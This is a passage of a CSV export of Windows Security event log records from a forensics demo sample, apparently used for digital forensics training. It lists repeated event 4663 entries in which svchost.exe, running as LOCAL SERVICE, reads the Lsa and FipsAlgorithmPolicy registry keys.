AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
66,452876,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
67,452877,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
68,452878,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
69,452879,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
70,452880,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
71,452881,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
72,452882,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
73,452883,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
74,452884,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
75,452885,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
76,452886,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
77,452887,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
78,452888,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
79,452889,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
80,452890,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
81,452891,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
82,452892,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
83,452893,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
84,452894,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
85,452895,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
86,452896,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
